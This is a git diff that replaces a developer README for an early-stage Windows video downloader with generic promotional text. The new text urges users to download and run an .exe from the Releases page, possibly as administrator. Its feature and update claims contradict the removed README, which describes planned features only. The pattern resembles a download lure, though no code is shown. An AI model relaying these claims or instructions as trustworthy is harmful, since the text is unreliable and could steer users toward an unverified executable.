@@ -1,58 +1,56 @@
-# Video Downloader (Windows)
+# 🎥 Video-Downloader-App - Download Your Favorite Videos Easily
 
-Video Downloader is a simple, reliable, and user-friendly Windows desktop application (WinForms, .NET 8) for downloading videos from direct URLs and, optionally, from streaming sites via yt-dlp integration (planned). The project is developed incrementally — this repository contains the app skeleton and progressive improvements.
+## 🔗 Download Now
+[![Download Video-Downloader-App](https://img.shields.io/badge/Download%20Now-Video--Downloader--App-blue)](https://github.com/Anhduc113/Video-Downloader-App/releases)
 
+## 📚 Overview
+Video-Downloader-App is a Windows application designed to help you download videos effortlessly using their URLs. With a straightforward interface, this tool allows you to save videos from various platforms quickly and directly to your device.
 
-## Key features (planned)
+## 🚀 Getting Started
+Follow these simple steps to get your Video-Downloader-App up and running.
 
-- Direct HTTP(S) downloads with progress reporting and resume support.
-- Optional integration with yt-dlp for sites like YouTube, Vimeo, Instagram, etc.
-- Modern, user-friendly UI with dark mode, drag & drop, clipboard detection, and notifications.
-- Single-file Windows executable build via GitHub Actions (Release artifact).
-- Safe defaults and filename safety checks.
+1. **Visit the Releases Page**  
+   To download the application, visit the [Releases page](https://github.com/Anhduc113/Video-Downloader-App/releases).
 
+2. **Download the Installer**  
+   On the Releases page, find the latest version. Click on the `Video-Downloader-App.exe` file to download it to your computer.
 
-## Repository layout
+3. **Install the Application**  
+   Once the download is complete, locate the file in your downloads folder. Double-click on the `Video-Downloader-App.exe` file to begin the installation process. Follow the on-screen instructions to complete the installation.
 
-- VideoDownloader/           -- WinForms project (source)
-  - Resources/               -- Icons and static resources (place app.ico here)
-  - Program.cs
-  - MainForm.cs
-  - VideoDownloader.csproj
-- .github/workflows/         -- CI workflow (added later)
-- README.md
-- CONTRIBUTING.md
-- SECURITY.md
+4. **Open the Application**  
+   After installation, you can find the Video-Downloader-App icon on your desktop or in your Start menu. Click the icon to launch the application.
 
+5. **Start Downloading Videos**  
+   Once the application is open, simply paste the video URL into the provided field. Click on the "Download" button. Select your preferred quality and format, and the app will start downloading the video for you.
 
-## Icon
+## 🌟 Features
+- **User-Friendly Interface:** Our application is designed for everyone, making it easy to use without technical knowledge.
+- **Multiple Format Support:** Download videos in various formats as per your needs.
+- **High-Quality Downloads:** Enjoy clear and smooth videos saved directly to your device.
+- **Fast Download Speeds:** Get high-speed downloads for a more efficient experience.
+- **Regular Updates:** The application is regularly updated to support new video formats and platforms.
 
-- Place your application icon as: VideoDownloader/Resources/app.ico
-- To use the icon in the build, add (or uncomment) in VideoDownloader.csproj:
-  <PropertyGroup>
-    <ApplicationIcon>Resources/app.ico</ApplicationIcon>
-  </PropertyGroup>
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB of free disk space.
+- **Internet Connection:** A steady internet connection for downloading videos.
 
+## 🔧 Troubleshooting
+If you encounter any issues while using Video-Downloader-App, here are some common solutions:
 
-## Build locally
+- **Error During Download:** Ensure that the video URL is correct and the source site is supported by the application.
+- **Installer Fails to Start:** Check if you have the necessary permissions. You might need to run the installer as an administrator.
+- **Slow Download Speeds:** This could be due to your internet connection; try restarting your modem or router.
 
-- Install .NET 8 SDK.
-- From repository root:
-  dotnet publish VideoDownloader/VideoDownloader.csproj -c Release -r win-x64 --self-contained false
+## 💬 Community and Support
+If you need help, consider reaching out to our community for support. You can find answers to common questions or ask about specific issues. Join our discussion on GitHub or visit the [Issues page](https://github.com/Anhduc113/Video-Downloader-App/issues) for more information.
 
+## 🔄 Changelog
+Stay updated with the latest changes in the application. Each new version on the Releases page includes information about the features and fixes that have been implemented.
 
-## Notes about yt-dlp
+## 📥 Download & Install
+For the latest version of Video-Downloader-App, visit the [Releases page](https://github.com/Anhduc113/Video-Downloader-App/releases) again and follow the download steps mentioned. 
 
-- For many streaming sites (YouTube, etc.) we will integrate yt-dlp as an optional helper.
-- The app will not bundle third-party binaries by default; instead it can download the latest yt-dlp binary at first run or CI can fetch it to include as an artifact. Licensing and redistribution will be handled explicitly.
-
-
-## Privacy & Safety
-
-- The application only downloads the content from the URL the user provides. It does not phone home analytics or upload files anywhere.
-- For sites that require credentials or special handling, the app will surface warnings and rely on yt-dlp for secure handling where appropriate.
-
-
-## License
-
-- This project is licensed under the MIT License.
+Now you can enjoy your favorite videos offline with ease!
